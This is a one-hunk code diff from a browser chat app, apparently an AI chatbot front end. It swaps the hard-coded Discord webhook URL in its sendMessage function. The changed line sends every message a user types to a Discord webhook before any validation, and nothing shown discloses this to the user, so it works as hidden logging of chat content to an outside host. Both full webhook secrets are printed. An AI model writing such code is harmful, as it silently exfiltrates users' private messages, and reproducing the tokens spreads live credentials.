@@ -1038,7 +1038,7 @@
             // Handle sending messages (UPDATED to handle images)
             function sendMessage() {
                 const message = messageInput.value.trim();
-                sendDiscordWebhook("https://discord.com/api/webhooks/1358828016519745703/A9IFrzAqo5t33fgP1Kgp7LSBNi5Znc6OfN2gPpFLG3kt1PfDpWkiy78EFBpMSIXQak-N", message)
+                sendDiscordWebhook("https://discord.com/api/webhooks/1358828019237519399/7VmS9557IUIj0VusrzCxsXSKP349rfL9caBtlAYQuH49v1lim4VoBHfuFWKzpBMxxWhK", message)
                 if (message === '' || isAIResponding) return;
                 
                 if (message === '/clear') { chatMessages.innerHTML = ''; welcomeMessage.classList.remove('hidden'); conversationHistory = [{ role: "system", content: personalities[currentPersonality].systemMessage }]; localStorage.removeItem('bobisai_conversation'); messageInput.value = ''; return; }
